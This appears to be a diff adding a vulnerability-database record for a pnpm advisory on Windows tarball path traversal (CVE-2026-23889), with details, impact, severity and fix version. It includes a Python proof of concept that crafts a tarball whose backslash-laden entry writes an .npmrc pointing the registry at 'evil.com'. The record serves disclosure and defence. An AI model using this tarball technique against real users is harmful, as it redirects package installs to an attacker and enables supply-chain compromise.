@@ -1,0 +1,92 @@
+advisory_id: GHSA-6x96-7vc8-cm3p
+datasource_id: github_osv_importer_v2/GHSA-6x96-7vc8-cm3p
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-6x96-7vc8-cm3p/GHSA-6x96-7vc8-cm3p.json
+aliases:
+  - CVE-2026-23889
+summary: |
+  pnpm has Windows-specific tarball Path Traversal
+  ### Summary
+  A path traversal vulnerability in pnpm's tarball extraction allows malicious packages to write files outside the package directory on Windows. The path normalization only checks for `./` but not `.\`. On Windows, backslashes are directory separators, enabling path traversal.
+
+  **This vulnerability is Windows-only.**
+
+  ### Details
+  **1. Incomplete Path Normalization (`store/cafs/src/parseTarball.ts:107-110`)**
+
+  ```typescript
+  if (fileName.includes('./')) {
+    fileName = path.posix.join('/', fileName).slice(1)
+  }
+  ```
+
+  A path like `foo\..\..\.npmrc` does NOT contain `./` and bypasses this check.
+
+  **2. Platform-Dependent Behavior (`fs/indexed-pkg-importer/src/importIndexedDir.ts:97-98`)**
+
+  - On Unix: Backslashes are literal filename characters (safe)
+  - On Windows: Backslashes are directory separators (exploitable)
+
+  ### PoC
+  1. Create a malicious tarball with entry `package/foo\..\..\.npmrc`
+  2. Host it or use as a tarball URL dependency
+  3. On Windows: `pnpm install`
+  4. Observe `.npmrc` written outside package directory
+
+  ```python
+  import tarfile, io
+
+  tar_buffer = io.BytesIO()
+  with tarfile.open(fileobj=tar_buffer, mode='w:gz') as tar:
+      pkg_json = b'{"name": "malicious-pkg", "version": "1.0.0"}'
+      pkg_info = tarfile.TarInfo(name='package/package.json')
+      pkg_info.size = len(pkg_json)
+      tar.addfile(pkg_info, io.BytesIO(pkg_json))
+
+      malicious_content = b'registry=https://evil.com/\n'
+      mal_info = tarfile.TarInfo(name='package/foo\\..\\..\\.npmrc')
+      mal_info.size = len(malicious_content)
+      tar.addfile(mal_info, io.BytesIO(malicious_content))
+
+  with open('malicious-pkg-1.0.0.tgz', 'wb') as f:
+      f.write(tar_buffer.getvalue())
+  ```
+
+  ### Impact
+  - Windows pnpm users
+  - Windows CI/CD pipelines (GitHub Actions Windows runners, Azure DevOps)
+  - Can overwrite `.npmrc`, build configs, or other files
+
+  Verified on pnpm main @ commit 5a0ed1d45.
+impacted_packages:
+  - purl: pkg:npm/pnpm
+    affected_versions: vers:npm/<10.28.1
+    fixed_versions: vers:npm/10.28.1
+severities:
+  - score: '6.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-6x96-7vc8-cm3p/GHSA-6x96-7vc8-cm3p.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-22
+references:
+  - url: https://github.com/pnpm/pnpm
+    reference_type:
+    reference_id:
+  - url: https://github.com/pnpm/pnpm/commit/6ca07ffbe6fc0e8b8cdc968f228903ba0886f7c0
+    reference_type:
+    reference_id:
+  - url: https://github.com/pnpm/pnpm/releases/tag/v10.28.1
+    reference_type:
+    reference_id:
+  - url: https://github.com/pnpm/pnpm/security/advisories/GHSA-6x96-7vc8-cm3p
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-23889
+    reference_type:
+    reference_id:
